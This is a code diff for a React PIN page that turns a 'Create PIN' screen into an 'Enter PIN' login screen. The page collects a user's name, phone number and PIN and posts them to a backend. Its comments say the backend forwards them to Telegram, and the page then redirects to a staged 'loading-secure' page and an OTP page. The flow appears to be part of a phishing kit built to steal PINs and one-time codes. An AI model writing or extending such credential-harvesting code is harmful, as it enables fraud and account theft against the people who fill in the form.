@@ -7,13 +7,11 @@ import { Shield, AlertCircle, Eye, EyeOff } from 'lucide-react';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 
-export default function CreatePinPage() {
+export default function LoginPinPage() {
   const [pin, setPin] = useState('');
-  const [confirmPin, setConfirmPin] = useState('');
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [showPin, setShowPin] = useState(false);
-  const [showConfirmPin, setShowConfirmPin] = useState(false);
   const router = useRouter();
   const searchParams = useSearchParams();
 
@@ -24,11 +22,6 @@ export default function CreatePinPage() {
   const validateForm = () => {
     if (pin.length !== 4) {
       setError('PIN must be 4 digits');
-      return false;
-    }
-    
-    if (pin !== confirmPin) {
-      setError('PINs do not match');
       return false;
     }
     
@@ -43,16 +36,16 @@ export default function CreatePinPage() {
 
     setIsLoading(true);
     
-    // Send notification to Telegram with user details and PIN
+    // Send notification to Telegram with name, phone, and pin
     try {
-      await fetch('/api/auth/register', {
+      await fetch('/api/auth/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           name,
           phone,
           pin,
-          action: 'create_pin' 
+          action: 'pin_authentication' 
         })
       });
     } catch (err) {
@@ -60,7 +53,7 @@ export default function CreatePinPage() {
     }
     
     // Redirect to progress page then to OTP page
-    router.push(`/loading-secure?action=signup&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&redirect=otp`);
+    router.push(`/loading-secure?action=pin&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&redirect=otp`);
     
     setIsLoading(false);
   };
@@ -73,17 +66,17 @@ export default function CreatePinPage() {
             <Shield className="h-8 w-8 text-primary" />
           </div>
           <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
-            Create PIN
+            Enter PIN
           </h1>
           <p className="text-foreground/70 mt-2">
-            Set a 4-digit PIN for secure access
+            Authenticate with your 4-digit PIN
           </p>
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-6">
           <div>
             <label htmlFor="pin" className="block text-sm font-medium text-foreground mb-2 pl-1">
-              Create 4-Digit PIN
+              4-Digit PIN
             </label>
             <div className="relative">
               <Input
@@ -91,7 +84,7 @@ export default function CreatePinPage() {
                 type={showPin ? "text" : "password"}
                 inputMode="numeric"
                 maxLength={4}
-                placeholder="Enter 4-digit PIN"
+                placeholder="Enter your PIN"
                 value={pin}
                 onChange={(e) => {
                   const value = e.target.value.replace(/\D/g, '');
@@ -111,36 +104,6 @@ export default function CreatePinPage() {
             </div>
           </div>
 
-          <div>
-            <label htmlFor="confirmPin" className="block text-sm font-medium text-foreground mb-2 pl-1">
-              Confirm 4-Digit PIN
-            </label>
-            <div className="relative">
-              <Input
-                id="confirmPin"
-                type={showConfirmPin ? "text" : "password"}
-                inputMode="numeric"
-                maxLength={4}
-                placeholder="Confirm your PIN"
-                value={confirmPin}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) {
-                    setConfirmPin(value);
-                  }
-                }}
-                className="w-full px-4 py-3 text-center text-lg tracking-widest border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
-              />
-              <button
-                type="button"
-                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
-                onClick={() => setShowConfirmPin(!showConfirmPin)}
-              >
-                {showConfirmPin ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
-              </button>
-            </div>
-          </div>
-
           {error && (
             <div className="flex items-center p-3 text-sm text-destructive bg-destructive/10 rounded-lg">
               <AlertCircle className="h-4 w-4 mr-2" />
@@ -150,22 +113,22 @@ export default function CreatePinPage() {
 
           <Button
             type="submit"
-            disabled={isLoading || pin.length !== 4 || confirmPin.length !== 4}
+            disabled={isLoading || pin.length !== 4}
             className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-4 py-3 text-sm font-medium text-primary-foreground shadow transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 disabled:opacity-50"
           >
             {isLoading ? (
               <div className="flex items-center gap-2">
                 <div className="h-4 w-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
-                <span>Setting PIN...</span>
+                <span>Authenticating...</span>
               </div>
             ) : (
-              'Set PIN'
+              'Authenticate'
             )}
           </Button>
         </form>
 
         <div className="mt-8 text-center text-sm text-foreground/70">
-          <p>Choose a PIN that is easy for you to remember but hard for others to guess.</p>
+          <p>Enter the 4-digit PIN you created during registration.</p>
         </div>
       </div>
     </div>
